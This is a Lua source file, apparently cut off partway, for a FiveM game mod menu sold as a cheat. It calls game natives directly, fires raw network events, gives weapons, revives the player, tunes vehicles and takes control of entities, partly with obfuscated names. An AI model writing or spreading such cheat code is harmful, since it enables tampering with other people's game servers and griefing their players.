-- the best mod menu on fivem brought to u by antek (cofee)
-- the best mod menu on fivem brought to u by antek (cofee)
-- the best mod menu on fivem brought to u by antek (cofee)
local Invoken = Citizen.InvokeNative
local MenuEnabled = true
GiveWeaponToPed(PlayerPedId(), GetHashKey("weapon_pistol"), 200, false, false)
local SelectedPlayer = PlayerId()

local function TriggerPrivateEvent(server, event, ...)
    local payload = msgpack.pack({...})
    if server then
        Invoken(0x7fdd1128, event, payload)
    else
        Invoken(0x91310870, event, payload)
    end
end
local 

function ReviveCoords(value, numDecimalPlaces)
    if numDecimalPlaces then
        local power = 10^numDecimalPlaces
        return math.floor((value * power) + 0.5) / (power)
    else
        return math.floor(value + 0.5)
    end
end

local function ReviveFunction(ped, coords, heading)
    Invoken(0x239A3351AC1DA385, ped, coords.x, coords.y, coords.z, false, false, false, true)
    Invoken(0xEA23C49EAA83ACFB, coords.x, coords.y, coords.z, heading, true, false)
    Invoken(0x239528EACDC3E7DE, ped, false)
    TriggerPrivateEvent(false, 'playerSpawned', coords.x, coords.y, coords.z)
    Invoken(0x8FE22675A5A45817, ped)
end

local function Revive()
    local coords = GetEntityCoords(Invoken(0xD80958FC74E988A6))

    local formattedCoords = {
        x = ReviveCoords(coords.x, 1),
        y = ReviveCoords(coords.y, 1),
        z = ReviveCoords(coords.z, 1)
    }

    ReviveFunction(Invoken(0xD80958FC74E988A6), formattedCoords, 0.0)
    Invoken(0x068E835A1D0DC0E3, 'DeathFailOut')
end

local props_IDHSOGLFDSKGDUHIOSSD = {
    "hei_prop_carrier_radar_1",
    "hei_prop_carrier_defense_02",
    "hei_prop_mini_sever_02",
    "hei_prop_ss1_mpint_door_l",
    "lts_prop_lts_elecbox_24",
    "lts_prop_lts_elecbox_24b",
    "p_armchair_01_s",
    "p_beefsplitter_s",
    "p_cablecar_s",
    "p_crahsed_heli_s",
    "p_cs_mp_jet_01_s",
    "p_gate_prison_01_s",
    "vp_ld_coffee_vend_01",
    "p_lestersbed_s",
    "p_lev_sofa_s",
    "p_med_jet_01_s",
    "p_mbbed_s",
    "p_new_j_counter_03",
    "p_oil_pjack_02_s",
    "p_oil_pjack_03_s",
    "p_tram_crash_s",
    "p_v_med_p_sofa_s",
    "p_v_res_tt_bed_s",
    "prop_barrel_pile_01",
    "prop_air_generator_03",
    "prop_air_sechut_01",
    "prop_aircon_l_01",
    "prop_aircon_m_10",
    "prop_aircon_tna_02",
    "prop_asteroid_01",
    "prop_barier_conc_05c",
    "prop_barrel_pile_01",
    "prop_bbq_3",
    "prop_bench_03",
    "prop_bh1_09_mp_gar",
    "prop_big_cin_screen",
    "prop_biolab_g_door",
    "prop_bleachers_05_cr",
    "prop_bmu_02_ld",
    "prop_box_wood04a",
    "prop_boxpile_02b",
    "prop_boxpile_07a",
    "prop_bumper_04",
    "prop_bush_lrg_01e_cr2",
    "prop_bush_lrg_01c_cr",
    "prop_busstop_04",
    "prop_byard_dingy",
    "prop_byard_floatpile",
    "prop_byard_rowboat1",
    "prop_cablespool_03",
    "prop_car_battery_01",
    "prop_cash_crate_01",
    "prop_cctv_unit_01",
    "prop_cementbags01",
    "prop_ch2_05d_g_door",
    "prop_cleaning_trolly",
    "prop_coffin_01",
    "prop_coffin_02b",
    "prop_com_gar_door_01",
    "prop_com_ls_door_01"
}

local Sliderson = {
    Menu = {
        MenuX = 0.5,
        MenuY = 0.5,
    },
    Sliderki = {
        [1] = {
            value = 0,
            min = 0,
            max = 100,
            side_moneyware = 1
        },

        [2] = {
            value = 247,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [3] = {
            value = 1,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [4] = {
            value = 237,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [5] = {
            value = 0,
            min = 0,
            max = 30,
            side_moneyware = 2
        },
         [6] = {
            value = 0,
            min = 0,
            max = 30,
            side_moneyware = 2
        },
        [7] = {
            value = 0,
            min = 0,
            max = 30,
            side_moneyware = 2
        },
        [8] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [9] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [10] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [11] = {
            value = 1,
            min = 0,
            max = 15,
            side_moneyware = 3
        },

        [12] = {
            value = 1,
            min = 0,
            max = 15,
            side_moneyware = 3
        },

        [13] = {
            value = 2,
            min = 0,
            max = 10,
            side_moneyware = 1
        },

        [14] = {
            value = 0,
            min = 0,
            max = 255,
            side_moneyware = 1
        },

        [15] = {
            value = 150,
            min = 0,
            max = 400,
            side_moneyware = 1
        },


        [16] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [17] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },
        [18] = {
            value = 255,
            min = 0,
            max = 255,
            side_moneyware = 2
        },

        [19] = {
            value = 1,
            min = 0,
            max = 12,
            side_moneyware = 1
        },

        [20] = {
            value = 1,
            min = 0,
            max = 1000,
            side_moneyware = 1
        },

        [21] = {
            value = 0,
            min = 0,
            max = 7,
            side_moneyware = 1
        },

        [22] = {
            value = 2,
            min = 0,
            max = 50,
            side_moneyware = 1
        },

        [23] = {
            value = 1,
            min = 0,
            max = 50,
            side_moneyware = 4
        },

        [24] = {
            value = 0,
            min = 0,
            max = 10000,
            side_moneyware = 1
        },

        [25] = {
            value = 0,
            min = 0,
            max = 50,
            side_moneyware = 1
        },

        [26] = {
            value = 0,
            min = 0,
            max = 50,
            side_moneyware = 1
        }


    }
}


local tab = "Fewfse"
local subtab = "Overlay"
local Freecam = false
local frozen_entities                 = {}
local tryb                            = 1
local modes                           = {"Look Around","Shoot","Create Objects"}
local peds                            = {}
local object_freecam                  = nil
local freecam_object_heading          = nil
local freecam_object_rotation         = 0.0
local freecam_entity_dragging_heading = nil
local PlayerIds = GetActivePlayers()
local scrool = 11

local function GetTextWidht(str, font, scale)
    BeginTextCommandWidth("STRING")
    AddTextComponentSubstringPlayerName(str)
    SetTextFont(font or 4)
    SetTextScale(scale or 0.35, scale or 0.35)
    local length = EndTextCommandGetWidth(1)

    return length
end

local function text(nazwa,outline,size,Justification,xx,yy, centre, font, r, g, b)
    if outline then SetTextOutline()end
    if font ~= nil and tonumber(font) ~= nil then SetTextFont(font) else SetTextFont(0) end
    if centre then SetTextCentre(true) end
    SetTextColour(r, g, b, 255)
    SetTextProportional(1)
    SetTextScale(100.0, size)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa)
    EndTextCommandDisplayText(xx, yy)
end


local function OnlineButton(id, nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    local widht = GetTextWidht(text, 0, 0.2)
    if( (x / 1920) + 0.003 >= xx and (x / 1920) - (widht/1.5) <= xx and (y / 1080) + 0.0115 >= yy and (y / 1080) - 0.011 <= yy) then
        --(0.73, yy + 0.06, 0.1, 0.2, 17, 17, 17, 160)
        text("[".. id .. "] > ".. nazwa,outline,0.23,0,xx,yy - 0.009, false, 0, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value) 
        if IsDisabledControlJustReleased(0, 92) then
            return true
        end
    else
        text("[".. id .. "] > ".. nazwa,outline,0.23,0,xx,yy - 0.009, false, 0, 255, 255, 255)
    end
    return false
end

local function RequestControlOnce(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

local function RequestModelSync(model_DSIGHODSIGSD, timeout_DSIUFHISDGSDG)
        timeout_DSIUFHISDGSDG = timeout_DSIUFHISDGSDG or 2500
        local counter_DSGIHSDIUGJDSGDS = 0
        Invoken(0x963D27A58DF860AC, Invoken(0xD24D37CC275948CC, model_DSIGHODSIGSD))

        while not Invoken(0x98A4EB5D89A0C952, Invoken(0xD24D37CC275948CC, model_DSIGHODSIGSD)) do
            Invoken(0x963D27A58DF860AC, model_DSIGHODSIGSD)
            counter_DSGIHSDIUGJDSGDS = counter_DSGIHSDIUGJDSGDS + 100
            Wait(0)
            if counter_DSGIHSDIUGJDSGDS >= timeout_DSIUFHISDGSDG then return false end
        end

        return true
    end

    local function StartTransitionTimecycle(modifier)
    if GetTimecycleTransitionModifierIndex() == -1 and GetTimecycleModifierIndex() == -1 then
        SetTransitionTimecycleModifier(modifier, 5.0)
    else
        ClearTimecycleModifier()
    end
end

-- StartTransitionTimecycle("int_lesters")

local AllGuns = {
            "PISTOL",
            "PISTOL_MK2",
            "COMBATPISTOL",
            "APPISTOL",
            "REVOLVER",
            "REVOLVER_MK2",
            "DOUBLEACTION",
            "PISTOL50",
            "SNSPISTOL",
            "SNSPISTOL_MK2",
            "HEAVYPISTOL",
            "VINTAGEPISTOL",
            "STUNGUN",
            "FLAREGUN",
            "MARKSMANPISTOL",
            "KNIFE",
            "KNUCKLE",
            "NIGHTSTICK",
            "HAMMER",
            "BAT",
            "GOLFCLUB",
            "CROWBAR",
            "BOTTLE",
            "DAGGER",
            "HATCHET",
            "MACHETE",
            "FLASHLIGHT",
            "SWITCHBLADE",
            "POOLCUE",
            "PIPEWRENCH",
            "MICROSMG",
            "MINISMG",
            "SMG",
            "SMG_MK2",
            "ASSAULTSMG",
            "COMBATPDW",
            "GUSENBERG",
            "MACHINEPISTOL",
            "MG",
            "COMBATMG",
            "COMBATMG_MK2",
            "ASSAULTRIFLE",
            "ASSAULTRIFLE_MK2",
            "CARBINERIFLE",
            "CARBINERIFLE_MK2",
            "ADVANCEDRIFLE",
            "SPECIALCARBINE",
            "SPECIALCARBINE_MK2",
            "BULLPUPRIFLE",
            "BULLPUPRIFLE_MK2",
            "COMPACTRIFLE",
            "PUMPSHOTGUN",
            "PUMPSHOTGUN_MK2",
            "SWEEPERSHOTGUN",
            "SAWNOFFSHOTGUN",
            "BULLPUPSHOTGUN",
            "ASSAULTSHOTGUN",
            "MUSKET",
            "HEAVYSHOTGUN",
            "DBSHOTGUN",
            "SNIPERRIFLE",
            "HEAVYSNIPER",
            "HEAVYSNIPER_MK2",
            "MARKSMANRIFLE",
            "MARKSMANRIFLE_MK2",
            "GRENADELAUNCHER",
            "GRENADELAUNCHER_SMOKE",
            "RPG",
            "MINIGUN",
            "FIREWORK",
            "RAILGUN",
            "HOMINGLAUNCHER",
            "COMPACTLAUNCHER",
            "GRENADE",
            "STICKYBOMB",
            "PROXMINE",
            "BZGAS",
            "SMOKEGRENADE",
            "MOLOTOV",
            "FIREEXTINGUISHER",
            "PETROLCAN",
            "SNOWBALL",
            "FLARE",
            "BALL"
        }











local function SlynnyText(nazwa,outline,size,Justification,xx,yy, czcionka)
    if not czcionka then
        czcionka = 0
    end
   
    
    if outline then
        SetTextOutline()
    end
    SetTextFont(czcionka)
    SetTextProportional(1)
    SetTextScale(100.0, size)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa)
    EndTextCommandDisplayText(xx, yy)
end


local function DrawText3D_UDGUYSDHUGSFFDG(x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, text_diuigsodgsdfg, r_djguisernglse, g_IDJGIODSF, b_djguisernglse)
    Invoken(0xAA0008F3BBB8F416, x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, 0)
    Invoken(0x66E0276CC5F6B9DA, 0)
    Invoken(0x038C1F517D7FDCF8, 0)
    Invoken(0x07C837F9A01C34C9, 0.0, 0.20)
    Invoken(0xBE6B23FFA53FB442, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, 255)
    Invoken(0x465C84BC39F1C351, 0, 0, 0, 0, 255)
    Invoken(0x441603240D202FA6, 2, 0, 0, 0, 150)
    Invoken(0x1CA3E9EAC9D93E5E)
    Invoken(0x2513DFB0FB8400FE)
    Invoken(0x25FBB336DF1804CB, "STRING")
    Invoken(0xC02F4DBFB51D988B, 1)
    Invoken(0x6C188BE134E074AA, text_diuigsodgsdfg)
    Invoken(0xCD015E5BB0D96A57, 0.0, 0.0)
    Invoken(0xFF0B610F6BE0D7AF)
end


local function SubMenuButton(text, x, y, slider)

    SlynnyText(text, false, 0.23, false, x - 0.0387, y - 0.012, 0)

    DrawRect(x, y+0.015, 0.076, 0.0128, 0, 0, 0, 255)
    DrawRect(x, y+0.015, 0.075, 0.011, 20, 20, 20, 255)

    DrawRect(x + (slider.value/(slider.max/0.075)/2) - 0.0375, y+0.015, slider.value/(slider.max/0.075), 0.011, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)

    SlynnyText(slider.value, false, 0.3, false, x - 0.0046875, y + 0.005, 4)

    local CX = GetControlNormal(0, 239)
    local CY = GetControlNormal(0, 240)
    local sxl, sxr = GetSliderBorder(slider.side_moneyware)
    --print(CX * 100)
    if (CX - x > -0.038) and (CX - x < 0.039) and (CY - (y + 0.015) > -0.015) and (CY - (y + 0.015) < 0.015) and IsDisabledControlPressed(0, 69)  then

        local formula = ( ((CX * 100) - (sxl)) / (sxr - sxl) ) * (slider.max - slider.min) - slider.min
        slider.value = math.floor(formula)
    end

    if slider.value > slider.max then
        slider.value = slider.max
    elseif slider.value < slider.min then
        slider.value = slider.min
    end
end

local function SubMenuButton1(text, x, y, slider, r, g, b)

    SlynnyText(text, false, 0.23, false, x - 0.0387, y - 0.012, 0)

    DrawRect(x, y+0.015, 0.0763, 0.0128, 0, 0, 0, 255)
    DrawRect(x, y+0.015, 0.075, 0.011, 20, 20, 20, 255)

    DrawRect(x + (slider.value/(slider.max/0.075)/2) - 0.0375, y+0.015, slider.value/(slider.max/0.075), 0.011, r, g, b, 255)
    SlynnyText(slider.value, false, 0.3, false, x - 0.0046875, y + 0.005, 4)
    local CX = GetControlNormal(0, 239)
    local CY = GetControlNormal(0, 240)
    local sxl, sxr = GetSliderBorder(slider.side_moneyware)
    --print(CX * 100)
    if (CX - x > -0.038) and (CX - x < 0.039) and (CY - (y + 0.015) > -0.015) and (CY - (y + 0.015) < 0.015) and IsDisabledControlPressed(0, 69)  then

        local formula = ( ((CX * 100) - (sxl)) / (sxr - sxl) ) * (slider.max - slider.min) - slider.min
        slider.value = math.floor(formula)
    end

    if slider.value > slider.max then
        slider.value = slider.max
    elseif slider.value < slider.min then
        slider.value = slider.min
    end
end

local function SubMenuButton2(text, x, y, slider, r, g, b)

    SlynnyText(text, false, 0.23, false, x - 0.0387, y - 0.012, 0)

    DrawRect(x, y+0.015, 0.0763, 0.0218, 0, 0, 0, 255)
    DrawRect(x, y+0.015, 0.075, 0.02, 20, 20, 20, 255)

    DrawRect(x + (slider.value/(slider.max/0.075)/2) - 0.0375, y+0.015, slider.value/(slider.max/0.075), 0.02, r, g, b, 255)
    SlynnyText(slider.value, false, 0.3, false, x - 0.0046875, y + 0.005, 4)
    local CX = GetControlNormal(0, 239)
    local CY = GetControlNormal(0, 240)
    local sxl, sxr = GetSliderBorder(slider.side_moneyware)
    --print(CX * 100)
    if (CX - x > -0.038) and (CX - x < 0.039) and (CY - (y + 0.015) > -0.015) and (CY - (y + 0.015) < 0.015) and IsDisabledControlPressed(0, 69)  then

        local formula = ( ((CX * 100) - (sxl)) / (sxr - sxl) ) * (slider.max - slider.min) - slider.min
        slider.value = math.floor(formula)
    end

    if slider.value > slider.max then
        slider.value = slider.max
    elseif slider.value < slider.min then
        slider.value = slider.min
    end
end



local keys = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["xyz2"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["INSERT"] = 121,
    ["LEFT"] = 174,
    ["RIGHT"] = 175,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["MWHEELUP"] = 15,
    ["MWHEELDOWN"] = 14,
    ["LEFTSHIFT/N8"] = 61,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N9"] = 118,
    ["MOUSE1"] = 24,
    ["MOUSE2"] = 25,
    ["MOUSE3"] = 348
}
--local freecamkeybind = "LAWDWADA"
local NoclipKeybind = "B"


local function FullTune(vehicle)
        Invoken(0x1F2AA07F00B3217A, vehicle, 0)
        Invoken(0x487EB21CC7295BA1, vehicle, 7)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 0, GetNumVehicleMods(vehicle, 0) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 1, GetNumVehicleMods(vehicle, 1) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 2, GetNumVehicleMods(vehicle, 2) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 3, GetNumVehicleMods(vehicle, 3) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 4, GetNumVehicleMods(vehicle, 4) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 5, GetNumVehicleMods(vehicle, 5) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 6, GetNumVehicleMods(vehicle, 6) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 7, GetNumVehicleMods(vehicle, 7) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 8, GetNumVehicleMods(vehicle, 8) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 9, GetNumVehicleMods(vehicle, 9) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 10, GetNumVehicleMods(vehicle, 10) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 14, 16, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 17, true)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 18, true)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 19, true)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 20, true)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 21, true)
        Invoken(0x2A1F4F37F95BAD08, vehicle, 22, true)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 23, 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 24, 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 25, GetNumVehicleMods(vehicle, 25) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 27, GetNumVehicleMods(vehicle, 27) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 28, GetNumVehicleMods(vehicle, 28) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 30, GetNumVehicleMods(vehicle, 30) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 33, GetNumVehicleMods(vehicle, 33) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 34, GetNumVehicleMods(vehicle, 34) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 35, GetNumVehicleMods(vehicle, 35) - 1, false)
        Invoken(0x6AF0636DDEDCB6DD, vehicle, 38, GetNumVehicleMods(vehicle, 38) - 1, true)
        Invoken(0x57C51E6BAD752696, vehicle, 1)
        Invoken(0xEB9DC3C7D8596C46, vehicle, false)
        Invoken(0x9088EB5A43FFB0A1, vehicle, 5)
    end
    
    local function FullPerf(vehicle)
    Invoken(0x1F2AA07F00B3217A, vehicle, 0)
    Invoken(0x6AF0636DDEDCB6DD, vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false)
    Invoken(0x6AF0636DDEDCB6DD, vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false)
    Invoken(0x6AF0636DDEDCB6DD, vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false)
    Invoken(0x6AF0636DDEDCB6DD, vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false)
    Invoken(0x6AF0636DDEDCB6DD, vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false)
    Invoken(0x2A1F4F37F95BAD08, vehicle, 17, true)
    Invoken(0x2A1F4F37F95BAD08, vehicle, 18, true)
    Invoken(0x2A1F4F37F95BAD08, vehicle, 19, true)
    Invoken(0x2A1F4F37F95BAD08, vehicle, 21, true)
    Invoken(0xEB9DC3C7D8596C46, vehicle, false)
    end

local function DCamDirection()
    local KHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local GPitch = GetGameplayCamRelativePitch()
    local x = -math.sin(KHeading * math.pi / 180.0)
    local y = math.cos(KHeading * math.pi / 180.0)
    local z = math.sin(GPitch * math.pi / 180.0)
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    return x, y, z
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function CheckEntity(entity)
    if IsEntityAPed(entity) or IsEntityAVehicle(entity) or IsEntityAnObject(entity) then
        return true
    end
end

local function DrawText3D_MW_UDGUYSDHUGSFFDG(x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, text_diuigsodgsdfg, r_djguisernglse, g_IDJGIODSF, b_djguisernglse)
    Invoken(0xAA0008F3BBB8F416, x_dhgiuslergssdfg, y_d8ygso9hgh9ewdfg, z_tdsa8f7gisddfs, 0)
    Invoken(0x66E0276CC5F6B9DA, 0)
    Invoken(0x038C1F517D7FDCF8, 0)
    Invoken(0x07C837F9A01C34C9, 0.0, 0.20)
    Invoken(0xBE6B23FFA53FB442, r_djguisernglse, g_IDJGIODSF, b_djguisernglse, 255)
    Invoken(0x465C84BC39F1C351, 0, 0, 0, 0, 255)
    Invoken(0x441603240D202FA6, 2, 0, 0, 0, 150)
    Invoken(0x1CA3E9EAC9D93E5E)
    Invoken(0x2513DFB0FB8400FE)
    Invoken(0x25FBB336DF1804CB, "STRING")
    Invoken(0xC02F4DBFB51D988B, 1)
    Invoken(0x6C188BE134E074AA, text_diuigsodgsdfg)
    Invoken(0xCD015E5BB0D96A57, 0.0, 0.0)
    Invoken(0xFF0B610F6BE0D7AF)
end

local function BoundingBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)
        LineBox(entity, 255, 255, 255, 150)
        DrawPoly(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
        DrawPoly(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)
        DrawPoly(top_front_right, top_front_left, top_back_right, r, g, b, a)
        DrawPoly(top_front_left, top_back_left, top_back_right, r, g, b, a)
        DrawPoly(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
        DrawPoly(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)
        DrawPoly(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
        DrawPoly(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)
        DrawPoly(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
        DrawPoly(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)
        DrawPoly(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
        DrawPoly(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)
        return true
    end
    return false
end
local function LineBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)
        DrawLine(top_front_right, top_back_right, r, g, b, a)
        DrawLine(top_front_right, bottom_front_right, r, g, b, a)
        DrawLine(bottom_front_right, bottom_back_right, r, g, b, a)
        DrawLine(top_back_right, bottom_back_right, r, g, b, a)
        DrawLine(top_front_left, top_back_left, r, g, b, a)
        DrawLine(top_back_left, bottom_back_left, r, g, b, a)
        DrawLine(top_front_left, bottom_front_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_back_left, r, g, b, a)
        DrawLine(top_front_right, top_front_left, r, g, b, a)
        DrawLine(top_back_right, top_back_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_front_right, r, g, b, a)
        DrawLine(bottom_back_left, bottom_back_right, r, g, b, a)
    end
end

local function ResourceCheck(script)
       if GetResourceState(script) == "started" or string.upper(GetResourceState(script)) == "started" or
                string.lower(GetResourceState(script)) == "started" then
            return true
        else
            return false
        end
end


local function SlynnyText(nazwa,outline,size,Justification,xx,yy, czcionka)
    if outline then
        SetTextOutline()
    end
    if czcionka ~= nil and tonumber(czcionka) ~= nil then
    SetTextFont(czcionka)
    else
    SetTextFont(0)
    end
    SetTextProportional(1)
    SetTextScale(100.0, size)
    SetTextEdge(1, 0, 0, 0, 255)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(nazwa)
    EndTextCommandDisplayText(xx, yy)
end

local texture_preload = {
    "mpleaderboard",
    "commonmenu",
    "mpweaponscommon",
    "visualflow",
    "mptattoos",
    "mpweaponsgang1",
    "mphud",
    "mpweaponsunusedfornow"
}


local MW = {
    Menu = {
        MenuX = 0.5,
        MenuY = 0.5,
    }
}


    Citizen.CreateThread(function()
        local txd = CreateRuntimeTxd(
            "hugeware"
            )
        local dui = CreateDui(
            "https://cdn.discordapp.com/attachments/782576769856962580/810216130551218277/156.gif",
             156, 95)
        
        Citizen.Wait(
            1
            )
        local dui2 = GetDuiHandle(
            dui
            )
        Citizen.Wait(
            25
            )
        CreateRuntimeTextureFromDuiHandle(txd,
         "lysy",
          dui2)
    end)

    Citizen.CreateThread(function()
        local txd = CreateRuntimeTxd(
            "hugeware3"
            )
        local dui = CreateDui(
            "https://cdn.discordapp.com/attachments/782576769856962580/810607445185265724/persom3.png",
             170, 300)
        
        Citizen.Wait(
            1
            )
        local dui2 = GetDuiHandle(
            dui
            )
        Citizen.Wait(
            25
            )
        CreateRuntimeTextureFromDuiHandle(txd,
         "lysy3",
          dui2)
    end)

    Citizen.CreateThread(function()
        local txd = CreateRuntimeTxd(
            "hugeware2"
            )
        local dui = CreateDui(
            "https://cdn.discordapp.com/attachments/782576769856962580/810230770370609212/Comp_6.gif",
             500, 25)
        
        Citizen.Wait(
            1
            )
        local dui2 = GetDuiHandle(
            dui
            )
        Citizen.Wait(
            25
            )
